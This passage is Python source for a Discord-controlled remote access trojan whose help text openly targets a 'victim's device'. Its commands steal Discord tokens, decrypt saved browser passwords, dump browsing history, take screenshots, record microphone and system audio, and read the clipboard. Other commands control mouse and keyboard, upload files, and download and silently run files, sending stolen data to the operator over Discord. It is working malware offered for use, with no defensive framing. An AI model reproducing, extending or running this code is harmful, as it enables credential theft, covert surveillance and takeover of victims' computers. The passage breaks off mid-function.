    await ctx.fm_send(output, outputunsf, "startmenu.txt", )

@bot.command(aliases=["liststeamapps"], help="Lists installed Steam games with paths.", usage="$steamapps")
async def steamapps(ctx):
    def get_steam_path():
        paths = []
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam") as k:
                p, _ = winreg.QueryValueEx(k, "SteamPath")
                if p: paths.append(p)
        except Exception:
            pass
        for root in (winreg.HKEY_LOCAL_MACHINE,):
            for sub in (r"SOFTWARE\WOW6432Node\Valve\Steam", r"SOFTWARE\Valve\Steam"):
                try:
                    with winreg.OpenKey(root, sub) as k:
                        p, _ = winreg.QueryValueEx(k, "InstallPath")
                        if p: paths.append(p)
                except Exception:
                    pass
        paths += [
            os.path.expandvars(r"%PROGRAMFILES(X86)%\Steam"),
            os.path.expandvars(r"%PROGRAMFILES%\Steam"),
        ]
        for p in paths:
            p = os.path.normpath(p)
            if os.path.isdir(p):
                return p
        return None

    steam_path = get_steam_path()
    if not steam_path:
        await ctx.send("Could not locate Steam. Is it installed?")
        return

    library_vdf_path = os.path.join(steam_path, "steamapps", "libraryfolders.vdf")
    if not os.path.exists(library_vdf_path):
        await ctx.send("Could not find `libraryfolders.vdf` in your Steam folder.")
        return

    try:
        with open(library_vdf_path, 'r', encoding='utf-8') as f:
            data = vdf.load(f)
    except Exception as e:
        await ctx.send(f"Failed to parse libraryfolders.vdf: {e}")
        return

    libraries = []
    libroot = data.get('libraryfolders', {})
    for key, val in libroot.items():
        if key.isdigit():
            path = (val.get('path') if isinstance(val, dict) else None) or ""
            if path and os.path.isdir(path):
                libraries.append(os.path.normpath(path))

    if steam_path not in libraries:
        libraries.append(os.path.normpath(steam_path))

    games = []
    gamesunf = []
    for lib in libraries:
        steamapps_path = os.path.join(lib, "steamapps")
        for manifest_path in glob.glob(os.path.join(steamapps_path, "appmanifest_*.acf")):
            try:
                with open(manifest_path, 'r', encoding='utf-8') as f:
                    manifest = vdf.load(f)
                app_state = manifest.get('AppState', {})
                name = app_state.get('name', 'Unknown')
                install_dir = app_state.get('installdir', 'Unknown')
                full_path = os.path.join(steamapps_path, "common", install_dir)
                games.append(f'> **{name}** ``{full_path}``')
                gamesunf.append(f'{name} - {full_path}')
            except Exception as e:
                print(f"Failed to parse {manifest_path}: {e}")

    output = "\n".join(games) or "No steam games found."
    outputunsf = "\n".join(gamesunf) or "No steam games found."
    await ctx.fm_send(output, outputunsf, "output.txt")

@bot.command(aliases=["get_discord"], help="Gets discord tokens from Google Chrome, Opera (GX), Brave & Yandex", usage="$getdiscord")
async def getdiscord(ctx, max_force_profiles: int = 10):
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome_base = os.path.join(local, 'Google', 'Chrome', 'User Data')
    paths = {
        'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(roaming, 'Opera Software', 'Opera GX Stable'),
        'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Yandex': os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
    }

    def decrypt_token(encrypted_value, key):
        try:
            if encrypted_value.startswith(b'dQw4w9WgXcQ:'):
                encrypted_value = base64.b64decode(encrypted_value[15:])
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted.decode()
        except:
            return None

    embed = discord.Embed(title="Discord Tokens (Browser-Only)", color=discord.Color.blue())
    found_any = False

    def scan_leveldb(profile_path, aes_key):
        leveldb = os.path.join(profile_path, 'Local Storage', 'leveldb')
        tokens = set()

        if not os.path.exists(leveldb):
            return tokens

        for file_name in os.listdir(leveldb):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            try:
                with open(os.path.join(leveldb, file_name), errors='ignore') as f:
                    lines = f.readlines()
                for line in lines:
                    line = line.strip()
                    if aes_key and "dQw4w9WgXcQ:" in line:
                        for match in re.findall(r'dQw4w9WgXcQ:[^\"]+', line):
                            decrypted = decrypt_token(match.encode(), aes_key)
                            if decrypted:
                                tokens.add(decrypted)
                    for match in re.findall(r'mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line):
                        tokens.add(match)
            except:
                continue

        return tokens

    if os.path.exists(chrome_base):
        chrome_local_state = os.path.join(chrome_base, 'Local State')
        aes_key = get_master_key(chrome_local_state) if os.path.exists(chrome_local_state) else None
        chrome_tokens = set()

        # Always check Default
        default_path = os.path.join(chrome_base, "Default")
        if os.path.exists(default_path):
            chrome_tokens.update(scan_leveldb(default_path, aes_key))

        # Force check Profile 1 to max_force_profiles
        for i in range(1, max_force_profiles + 1):
            profile_path = os.path.join(chrome_base, f"Profile {i}")
            if os.path.exists(profile_path):
                chrome_tokens.update(scan_leveldb(profile_path, aes_key))

        # Continue checking Profile N+ until folder missing
        i = max_force_profiles + 1
        while True:
            profile_path = os.path.join(chrome_base, f"Profile {i}")
            if not os.path.exists(profile_path):
                break
            chrome_tokens.update(scan_leveldb(profile_path, aes_key))
            i += 1

        if chrome_tokens:
            found_any = True
            formatted = "\n".join(f"`{t}`" for t in chrome_tokens)
            embed.add_field(name="Google Chrome", value=formatted, inline=False)

    for platform, base_path in paths.items():
        try:
            local_state = os.path.join(os.path.dirname(base_path), 'Local State')
            aes_key = get_master_key(local_state) if os.path.exists(local_state) else None
            tokens = scan_leveldb(base_path, aes_key)
            if tokens:
                found_any = True
                formatted = "\n".join(f"`{t}`" for t in tokens)
                embed.add_field(name=platform, value=formatted, inline=False)
        except Exception as e:
            embed.add_field(name=platform, value=f"Error: `{str(e)}`", inline=False)

    if not found_any:
        embed.description = "No usable tokens found in browser paths."

    try:
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Error sending message: {str(e)}")

def decrypt_password(ciphertext, key):
    try:
        if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v11'):
            iv = ciphertext[3:15]
            payload = ciphertext[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload).decode()
        else:
            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
    except:
        return "Failed to decrypt"

def dump_passwords(login_data_path, key):
    if not os.path.exists(login_data_path):
        return []
    temp_db = os.path.join(os.getenv("TEMP"), "temp_browser_login_data.db")
    shutil.copyfile(login_data_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    entries = cursor.fetchall()
    conn.close()
    return entries

@bot.command(aliases=["get_passwords"], help="Gets passwords from Google Chrome & Opera GX", usage="$getpasswords")
async def getpasswords(ctx, max_force_profiles: int = 10):
    files = []
    missing_browsers = []

    # Chrome
    chrome_base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
    chrome_local_state = os.path.join(chrome_base, "Local State")

    if os.path.exists(chrome_local_state):
        try:
            chrome_key = get_master_key(chrome_local_state)
            chrome_output = io.StringIO()
            chrome_output.write("Chrome has patched password stealing, so if the victim has the latest version, this will not work untill I figure it out (I highly doubt I will).\n\n")
            
            default_login = os.path.join(chrome_base, "Default", "Login Data")
            if os.path.exists(default_login):
                entries = dump_passwords(default_login, chrome_key)
                if entries:
                    chrome_output.write("===== Default =====\n\n")
                    for url, username, pw in entries:
                        chrome_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, chrome_key)}\n{'-'*40}\n")

            for i in range(1, max_force_profiles + 1):
                profile = f"Profile {i}"
                login_data = os.path.join(chrome_base, profile, "Login Data")
                if os.path.exists(login_data):
                    entries = dump_passwords(login_data, chrome_key)
                    if entries:
                        chrome_output.write(f"\n===== {profile} =====\n\n")
                        for url, username, pw in entries:
                            chrome_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, chrome_key)}\n{'-'*40}\n")

            i = max_force_profiles + 1
            while True:
                profile = f"Profile {i}"
                login_data = os.path.join(chrome_base, profile, "Login Data")
                if not os.path.exists(login_data):
                    break
                entries = dump_passwords(login_data, chrome_key)
                if entries:
                    chrome_output.write(f"\n===== {profile} =====\n\n")
                    for url, username, pw in entries:
                        chrome_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, chrome_key)}\n{'-'*40}\n")
                i += 1

            if chrome_output.getvalue():
                chrome_buffer = io.BytesIO(chrome_output.getvalue().encode('utf-8'))
                files.append(discord.File(fp=chrome_buffer, filename="Chrome_passwords.txt"))
            else:
                missing_browsers.append("Chrome")

        except Exception:
            missing_browsers.append("Chrome")
    else:
        missing_browsers.append("Chrome")

    # Opera GX
    opera_path = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")
    opera_local_state = os.path.join(opera_path, "Local State")
    opera_login_data = os.path.join(opera_path, "Login Data")

    if os.path.exists(opera_local_state) and os.path.exists(opera_login_data):
        try:
            opera_key = get_master_key(opera_local_state)
            entries = dump_passwords(opera_login_data, opera_key)

            if entries:
                opera_output = io.StringIO()
                opera_output.write("===== Opera GX =====\n\n")
                for url, username, pw in entries:
                    opera_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, opera_key)}\n{'-'*40}\n")
                opera_buffer = io.BytesIO(opera_output.getvalue().encode('utf-8'))
                files.append(discord.File(fp=opera_buffer, filename="OperaGX_passwords.txt"))
            else:
                missing_browsers.append("Opera GX")

        except Exception:
            missing_browsers.append("Opera GX")
    else:
        missing_browsers.append("Opera GX")
        
    # Plain Opera
    opera_plain_path = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")
    opera_plain_local_state = os.path.join(opera_plain_path, "Local State")
    opera_plain_login_data = os.path.join(opera_plain_path, "Login Data")

    if os.path.exists(opera_plain_local_state) and os.path.exists(opera_plain_login_data):
        try:
            opera_plain_key = get_master_key(opera_plain_local_state)
            entries = dump_passwords(opera_plain_login_data, opera_plain_key)

            if entries:
                opera_output = io.StringIO()
                opera_output.write("===== Opera =====\n\n")
                for url, username, pw in entries:
                    opera_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, opera_plain_key)}\n{'-'*40}\n")
                opera_buffer = io.BytesIO(opera_output.getvalue().encode('utf-8'))
                files.append(discord.File(fp=opera_buffer, filename="Opera_passwords.txt"))
            else:
                missing_browsers.append("Opera")

        except Exception:
            missing_browsers.append("Opera")
    else:
        missing_browsers.append("Opera")

    content = ""
    if missing_browsers and len(missing_browsers) < 2:
        content = f"Files not found for: {missing_browsers[0]}"
    elif missing_browsers:
        content = "Files not found for: " + ", ".join(missing_browsers)

    if not files and not content:
        content = "No password files were found for either browser."

    try:
        await ctx.send(content=content, files=files if files else None)
    except Exception as e:
        await ctx.send(f"Error sending message: {e}")
        
@bot.command(aliases=["get_history"], help="Gets browser history from Google Chrome & Opera GX", usage="$gethistory")
async def gethistory(ctx, max_force_profiles: int = 10):
    files = []
    missing_browsers = []

    async def extract_chrome_history():
        base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
        if not os.path.exists(base):
            return None, "Chrome"

        output = io.StringIO()
        epochstart_tts = datetime.datetime(1601, 1, 1)
        min_date = datetime.datetime.utcnow() - datetime.timedelta(days=30)
        min_timestamp = int((min_date - epochstart_tts).total_seconds() * 1_000_000)

        async def extract(profile):
            try:
                profile_path = os.path.join(base, profile, "History")
                if not os.path.exists(profile_path):
                    return False
                temp_db = os.path.join(os.getenv("TEMP"), f"{profile}_history_temp.db")
                shutil.copy2(profile_path, temp_db)
            
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, last_visit_time FROM urls WHERE last_visit_time > ?", (min_timestamp,))
                rows = cursor.fetchall()
                if rows:
                    output.write(f"===== {profile} =====\n\n")
                    for url, ts in rows:
                        visit_time = epochstart_tts + datetime.timedelta(microseconds=ts)
                        output.write(f"URL: {url}\n")
                        output.write(f"Visited: {visit_time.strftime('%Y-%m-%d %H:%M:%S')} (UTC)\n")
                        output.write("----------------------------------------\n")
                    output.write("\n")
                conn.close()
            except Exception as e:
                await ctx.send("Error extracting Chrome history: " + str(e))
            if os.path.exists(temp_db):
                os.remove(temp_db)
            return True

        found = await extract("Default")

        for i in range(1, max_force_profiles + 1):
            found |= await extract(f"Profile {i}")

        i = max_force_profiles + 1
        while True:
            if not await extract(f"Profile {i}"):
                break
            i += 1
        return output.getvalue().encode("utf-8") if found else None, None

    async def extract_operagx_history():
        base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")
        history_path = os.path.join(base, "History")
        if not os.path.exists(history_path):
            return None, "Opera GX"
        try:
            output = io.StringIO()
            epochstart_tts = datetime.datetime(1601, 1, 1)
            min_date = datetime.datetime.utcnow() - datetime.timedelta(days=30)
            min_timestamp = int((min_date - epochstart_tts).total_seconds() * 1_000_000)

            temp_db = os.path.join(os.getenv("TEMP"), "opera_history_temp.db")
            shutil.copy2(history_path, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, last_visit_time FROM urls WHERE last_visit_time > ?", (min_timestamp,))
            rows = cursor.fetchall()
            if rows:
                output.write("===== Opera GX =====\n\n")
                for url, ts in rows:
                    visit_time = epochstart_tts + datetime.timedelta(microseconds=ts)
                    output.write(f"URL: {url}\n")
                    output.write(f"Visited: {visit_time.strftime('%Y-%m-%d %H:%M:%S')} (UTC)\n")
                    output.write("----------------------------------------\n")
                output.write("\n")
            conn.close()
        except Exception as e:
            await ctx.send("Error extracting Opera GX history: " + str(e))
        if os.path.exists(temp_db):
            os.remove(temp_db)
        return output.getvalue().encode("utf-8"), None
    
    async def extract_opera_history():
        base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Default")
        history_path = os.path.join(base, "History")
        if not os.path.exists(history_path):
            return None, "Opera"
        try:
            output = io.StringIO()
            epochstart_tts = datetime.datetime(1601, 1, 1)
            min_date = datetime.datetime.utcnow() - datetime.timedelta(days=30)
            min_timestamp = int((min_date - epochstart_tts).total_seconds() * 1_000_000)

            temp_db = os.path.join(os.getenv("TEMP"), "opera_plain_history_temp.db")
            shutil.copy2(history_path, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, last_visit_time FROM urls WHERE last_visit_time > ?", (min_timestamp,))
            rows = cursor.fetchall()
            if rows:
                output.write("===== Opera =====\n\n")
                for url, ts in rows:
                    visit_time = epochstart_tts + datetime.timedelta(microseconds=ts)
                    output.write(f"URL: {url}\n")
                    output.write(f"Visited: {visit_time.strftime('%Y-%m-%d %H:%M:%S')} (UTC)\n")
                    output.write("----------------------------------------\n")
                output.write("\n")
            conn.close()
        except Exception as e:
            await ctx.send("Error extracting Opera history: " + str(e))
        if os.path.exists(temp_db):
            os.remove(temp_db)
        return output.getvalue().encode("utf-8"), None

    chrome_data, chrome_err = await extract_chrome_history()
    opera_data, opera_err = await extract_operagx_history()
    opera_plain_data, opera_plain_err = await extract_opera_history()

    if chrome_data:
        chrome_buffer = io.BytesIO(chrome_data)
        files.append(discord.File(fp=chrome_buffer, filename="Chrome_history.txt"))
    elif chrome_err:
        missing_browsers.append(chrome_err)

    if opera_data:
        opera_buffer = io.BytesIO(opera_data)
        files.append(discord.File(fp=opera_buffer, filename="OperaGX_history.txt"))
    elif opera_err:
        missing_browsers.append(opera_err)

    if opera_plain_data:
        opera_plain_buffer = io.BytesIO(opera_plain_data)
        files.append(discord.File(fp=opera_plain_buffer, filename="Opera_history.txt"))
    elif opera_plain_err:
        missing_browsers.append(opera_plain_err)

    content = ""
    if missing_browsers and len(missing_browsers) == 1:
        content = f"Files not found for: {missing_browsers[0]}"
    elif missing_browsers:
        content = "Files not found for: " + ", ".join(missing_browsers)

    if not files and not content:
        content = "No history files were found for any browser."

    try:
        await ctx.send(content=content, files=files if files else None)
    except Exception as e:
        await ctx.send(f"Error sending message: {e}")

@bot.command(aliases=["mpos", "pos"], help="Move cursor to defined x and y pixel coordinates on victim's device. based on only the primariy display.", usage="$setpos <x> <y>")
async def setpos(ctx, x: int, y: int):
    try:
        pyautogui.moveTo(x, y)
        await ctx.send("Cursor position set successfully.")
    except Exception as e:
        await ctx.send(f"Error setting cursor position: {str(e)}")

@bot.command(help="Simulate left mouse click on victim's device.", usage="$lclick")
async def lclick(ctx):
    try:
        pyautogui.click(button='left')
        await ctx.send("Left click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing left click: {str(e)}")

@bot.command(help="Simulate middle mouse click on victim's device.", usage="$mclick")
async def mclick(ctx):
    try:
        pyautogui.click(button='middle')
        await ctx.send("Middle click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing middle click: {str(e)}")

@bot.command(help="Simulate right mouse click on victim's device.", usage="$rclick")
async def rclick(ctx):
    try:
        pyautogui.click(button='right')
        await ctx.send("Right click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing right click: {str(e)}")

@bot.command(help="Press a hotkey on victim's device. Available keys: https://bit.ly/3ya6vKg.", usage="$hotkey <keys ('btn+btn'/'btn btn')>")
async def hotkey(ctx, *, keys: str = ""):
    try:
        if not key or key == "":
            await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
            return

        k = keys.replace("+", " ").split()
        pyautogui.hotkey(*k)
        await ctx.send(f"Pressed hotkey: `{'+'.join(k)}`")
    except Exception as e:
        await ctx.send(f"Error: `{e}`")

@bot.command(aliases=["press"], help="Press a key/hotkey on victim's device. Available keys: https://bit.ly/3ya6vKg", usage="$key <key(s)>")
async def key(ctx, *, key: str = ""):
    try:
        if not key or key == "":
            await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
            return
        
        keys = key.replace("+", " ").split()
        if len(keys) == 1:
            pyautogui.press(key)
            await ctx.send(f"Pressed key: `{key}`")
        
        elif len(keys) < 1:
            await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
            return
        
        else:
            pyautogui.hotkey(*keys)
            await ctx.send(f"Pressed hotkey: `{'+'.join(keys)}`")
        
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Get or set the victim's clipboard.", usage="$clipboard <get|set <text>>")
async def clipboard(ctx, *, args: str = None):
    try:
        if not args:
            await ctx.send("Usage: `$clipboard <get|set <text>>`")
            return

        parts = args.split(" ", 1)
        action = parts[0].lower()

        if action == "get":
            clip = pyperclip.paste()
            await ctx.fm_send(f"```{clip}```", clip, "clipboard.txt", "Current Clipboard.txt")
        elif action == "set":
            if len(parts) == 1:
                await ctx.send("Please provide text to set.")
                return
            pyperclip.copy(parts[1])
            await ctx.send("Copied to clipboard.")
        else:
            await ctx.send("Invalid action. Use `get` or `set`.")
    except Exception as e:
        await ctx.send(f"Error executing command: {e}")

@bot.command(help="Takes a screenshot of the victim's screen including cursor location. Optionally accepts a display index (default 0 for the full desktop).", usage="$ss [displayNum|0 (default/all)]")
async def ss(ctx, display_index: int = 0):
    try:
        with mss.mss() as sct:
            monitors = sct.monitors
            if display_index < 0 or display_index >= len(monitors):
                available = ", ".join(str(i) for i in range(len(monitors)))
                await ctx.send(f"Invalid display index provided. Available displays: {available}")
                return

            monitor = monitors[display_index]
            sct_img = sct.grab(monitor)
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            cursor = pyautogui.position()
            relative_cursor = (cursor[0] - monitor["left"], cursor[1] - monitor["top"])
            draw = ImageDraw.Draw(img)
            x, y = relative_cursor
            draw.ellipse((x-5, y-5, x+5, y+5), fill=(255, 0, 0))
            
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            buffer.seek(0)
            await ctx.send("Command Executed! (Red dot indicates cursor)", file=discord.File(fp=buffer, filename="screenshot.png"))
    except Exception as e:
        await ctx.send(f"Error executing screenshot command: {str(e)}")
  
_tts_thread = None
_tts_error = None
_tts_stop = None
_MAX_CHUNK = 4096

def tts_worker(text, stop_evt: Event):
    global _tts_error
    pythoncom.CoInitialize()
    try:
        v = win32com.client.Dispatch("SAPI.SpVoice")
        cur = ""
        for t in re.split(r"([\.!?]\s+|\n+)", text):
            if not t:
                continue
            if len(cur) + len(t) > _MAX_CHUNK and cur:
                s = cur.strip()
                i = 0
                while i < len(s):
                    seg = s[i:i+_MAX_CHUNK].strip()
                    if seg:
                        if stop_evt.is_set(): break
                        v.Speak(seg, 1)
                        while True:
                            if stop_evt.is_set():
                                try: v.Speak("", 2)
                                except Exception: pass
                                break
                            if v.WaitUntilDone(150): break
                    i += _MAX_CHUNK
                if stop_evt.is_set(): break
                cur = t
            else:
                cur += t

        if not stop_evt.is_set():
            s = cur.strip()
            i = 0
            while i < len(s):
                seg = s[i:i+_MAX_CHUNK].strip()
                if seg:
                    if stop_evt.is_set(): break
                    v.Speak(seg, 1)
                    while True:
                        if stop_evt.is_set():
                            try: v.Speak("", 2)
                            except Exception: pass
                            break
                        if v.WaitUntilDone(150): break
                i += _MAX_CHUNK

        try: v.Speak("", 2)
        except Exception: pass
    except Exception as e:
        _tts_error = e
    finally:
        pythoncom.CoUninitialize()

def start_tts(text):
    global _tts_thread, _tts_stop, _tts_error
    _tts_error = None
    if _tts_thread and _tts_thread.is_alive():
        if _tts_stop: _tts_stop.set()
    text = re.sub(r"\s+", " ", text or "").strip()
    if not text: return False
    _stop = Event()
    _tts_stop = _stop
    _tts_thread = Thread(target=tts_worker, args=(text, _stop), daemon=True)
    _tts_thread.start()
    if _tts_error: raise _tts_error
    return True

@bot.command(name="tts", help="Run TTS on victim's system", usage="$tts <text>")
async def tts(ctx, *, text: str = None):
    if not text or not text.strip():
        await ctx.send("You must provide text for TTS")
        return
    try:
        ok = start_tts(text)
        await ctx.send(f"TTS started. Use {bot.command_prefix}stoptts to stop it." if ok else "You must provide text for TTS.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="ttsurl", help="Run TTS on victim's system from a URL (should be raw text)", usage="$ttsurl <url>")
async def ttsurl(ctx, url: str = None):
    if not url or not url.strip():
        await ctx.send("You must provide a url for TTS.")
        return
    try:
        r = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        r.raise_for_status()
        txt = r.text or ""
        if "html" in (r.headers.get("Content-Type","").lower()) or re.search(r"<\s*html", txt[:1000], re.I):
            txt = re.sub(r"(?is)<(script|style)\b[^>]*>.*?</\1>", " ", txt)
            txt = re.sub(r"(?is)<[^>]+>", " ", txt)
        ok = start_tts(txt)
        await ctx.send(f"TTS started. Use {bot.command_prefix}stoptts to stop it." if ok else "No readable text at that URL.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="stoptts", help="Stops TTS", usage="$stoptts")
async def stoptts(ctx):
    global _tts_thread, _tts_stop
    if _tts_thread and _tts_thread.is_alive():
        if _tts_stop: _tts_stop.set()
        await ctx.send("TTS process stopped.")
    else:
        await ctx.send("No TTS process running.")

record_guard = Event()

@bot.command(help="Records default audio device and default communications mic.", usage="$listen [in|out|both (default)]")
async def listen(ctx, mode: str = "both", duration: float = 10):
    if record_guard.is_set():
        await ctx.send("A recording is already in progress.")
        return
    record_guard.set()

    loop = asyncio.get_event_loop()
    MODE = mode.lower().strip()
    SECONDS = duration
    SR = 44100
    CH = 2
    SILENCE_RMS_THRESH = 1e-4

    def print_error(*a):
        try: print(*a)
        except: pass

    def to_stereo_float(x: np.ndarray) -> np.ndarray:
        a = x
        if a.ndim == 1: a = np.stack([a, a], axis=1)
        if a.shape[1] == 1: a = np.repeat(a, 2, axis=1)
        return a.astype(np.float32, copy=False)

    def to_int16_stereo(x: np.ndarray) -> np.ndarray:
        a = to_stereo_float(x)
        a = np.clip(a, -1.0, 1.0)
        return (a * 32767.0).astype(np.int16)

    def record_once(mic_obj, seconds: float, sr: int, ch: int):
        try:
            with mic_obj.recorder(samplerate=int(sr), channels=int(ch)) as r:
                return r.record(int(sr * seconds))
        except Exception as e:
            print_error("record_error:", repr(e))
            return None

    def stats(arr):
        if arr is None or arr.size == 0: return 0.0
        return float(np.sqrt(np.mean(np.square(arr.astype(np.float32)))))

    def probe_active_loopbacks(seconds_probe=0.25):
        try:
            speakers = {s.name for s in sc.all_speakers()}
            loopbacks = sc.all_microphones(include_loopback=True)
        except Exception as e:
            print_error("probe_enum_err:", repr(e))
            return []
        candidates = [m for m in loopbacks if m.name in speakers]
        active = []
        for m in candidates:
            frames = record_once(m, seconds_probe, SR, CH)
            rms = stats(frames)
            if frames is not None and rms > SILENCE_RMS_THRESH:
                active.append((getattr(m, "name", ""), m, rms))
        active.sort(key=lambda x: x[2], reverse=True)
        return active

    def pick_loopback_sources():
        active = probe_active_loopbacks(0.25)
        if active:
            return [m for _, m, _ in active]
        try:
            spk = sc.default_speaker()
            lb = sc.get_microphone(id=spk.name, include_loopback=True)
            return [lb]
        except Exception as e:
            print_error("fallback_loopback_error:", repr(e))
            return []

    def mix_float(arrs):
        arrs = [to_stereo_float(a) for a in arrs if a is not None]
        if not arrs: return None
        n = min(len(a) for a in arrs)
        if n <= 0: return None
        stack = np.stack([a[:n] for a in arrs], axis=0).astype(np.float32)
        mix = np.mean(stack, axis=0)
        return np.clip(mix, -1.0, 1.0)

    async def send_response(buf):
        await ctx.send(f"Command Executed! (mode={MODE})", file=discord.File(fp=buf, filename="output.wav"))

    def record(mode_sel: str):
        pythoncom.CoInitialize()
        try:
            want_out = mode_sel in ("both", "out")
            want_in  = mode_sel in ("both", "in")

            out_mix = None
            mic_frames = None

            if want_out:
                lbs = pick_loopback_sources()
                tracks = []
                for m in lbs:
                    frames = record_once(m, SECONDS, SR, CH)
                    tracks.append(frames)
                out_mix = mix_float(tracks)

            if want_in:
                try:
                    mic = sc.default_microphone()
                    mic_frames = record_once(mic, SECONDS, SR, CH)
                except Exception as e:
                    print_error("default_mic_error:", repr(e))
                    mic_frames = None

            if out_mix is not None and mic_frames is not None:
                n = min(len(out_mix), len(mic_frames))
                final = 0.5*out_mix[:n].astype(np.float32) + 0.5*to_stereo_float(mic_frames[:n])
                final = np.clip(final, -1.0, 1.0)
            elif out_mix is not None:
                final = out_mix
            elif mic_frames is not None:
                final = to_stereo_float(mic_frames)
            else:
                final = np.zeros((int(SR*SECONDS), 2), dtype=np.float32)

            pcm16 = to_int16_stereo(final)
            buf = io.BytesIO()
            w = wave.open(buf, "wb")
            w.setnchannels(2); w.setsampwidth(2); w.setframerate(SR)
            w.writeframes(pcm16.tobytes()); w.close()
            buf.seek(0)
            loop.call_soon_threadsafe(asyncio.create_task, send_response(buf))
        finally:
            pythoncom.CoUninitialize()
            record_guard.clear()

    Thread(target=record, args=(MODE,), daemon=True).start()

@bot.command(help="Types the given text on the victim's system.", usage="$write <text>")
async def write(ctx, *, text: str):
    try:
        pyautogui.write(text)
        await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
@bot.command(help="Upload a file to a specific path on victim's system", usage="$upload <destionation>")
async def upload(ctx, folder: str = None):
    if not folder:
        await ctx.send("Error: No folder path provided. Please specify a folder to upload the file to.")
        return
    if not os.path.exists(folder):
        os.makedirs(folder)
    if len(ctx.message.attachments) > 0:
        attachment = ctx.message.attachments[0]
        file_path = os.path.join(folder, attachment.filename)
        await attachment.save(file_path)
        await ctx.send(f"File `{attachment.filename}` has been saved to '{folder}'.")
    else:
        await ctx.send("Error: No file attached to the message.")

@bot.command(help="Lists contents of a folder on the system", usage="$ls <folder>")
async def ls(ctx, path: str = None):
    try:
        if not path:
            await ctx.send("Error: No path provided. Please specify a directory path to list.")
            return

        if not os.path.exists(path):
            await ctx.send(f"Error: The path '{path}' does not exist.")
            return
        if not os.path.isdir(path):
            await ctx.send(f"Error: The path '{path}' is not a directory.")
            return

        items = os.listdir(path)
        parent_dir = os.path.abspath(os.path.join(path, os.pardir))
        dirs = sorted([item for item in items if os.path.isdir(os.path.join(path, item))])
        files = sorted([item for item in items if os.path.isfile(os.path.join(path, item))])
        response = f"Parent Directory: {parent_dir}\n\n"

        if dirs or files:
            for directory in dirs:
                dir_full_path = os.path.join(path, directory)
                response += f"[DIR]  {dir_full_path}\n"
            for file in files:
                file_full_path = os.path.join(path, file)
                response += f"[FILE] {file_full_path}\n"
        else:
            response += "This directory is empty.\n"

        buffer = io.BytesIO(response.encode('utf-8'))
        await ctx.send(file=discord.File(fp=buffer, filename="directory_listing.txt"))
    except Exception as e:
        await ctx.send(f"Error: Could not list the directory contents. {str(e)}")

@bot.command(help="Downloads attached file and runs it on the victim's device.")
async def downloadandrun(ctx):
    if not ctx.message.attachments:
        await ctx.send("Error: No file attached. Please attach a file to download and run.")
        return

    attachment = ctx.message.attachments[0]

    downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
    if not os.path.exists(downloads_folder):
        os.makedirs(downloads_folder, exist_ok=True)

    file_path = os.path.join(downloads_folder, attachment.filename)
    try:
        file_bytes = await attachment.read()
        with open(file_path, "wb") as f:
            f.write(file_bytes)
    except Exception as e:
        await ctx.send(f"Error downloading file: {e}")
        return

    try:
        process = subprocess.Popen(f'cmd /c start "" /wait "{file_path}" && del /f /q "{file_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        await asyncio.to_thread(process.wait)
        await ctx.send("File executed and deleted after finishing.")
        
    except Exception as e:
        await ctx.send(f"Error executing file: {e}")
        if os.path.exists(file_path):
            os.remove(file_path)

@bot.command(help="Runs a specified program on victim's system", usage="$run <file>")
async def run(ctx, file_path: str = None):
    if not file_path:
        await ctx.send("Error: No file path provided. Please specify the file path to run.")
        return
    if not os.path.exists(file_path):
        await ctx.send(f"Error: The file '{file_path}' does not exist.")
        return
    try:
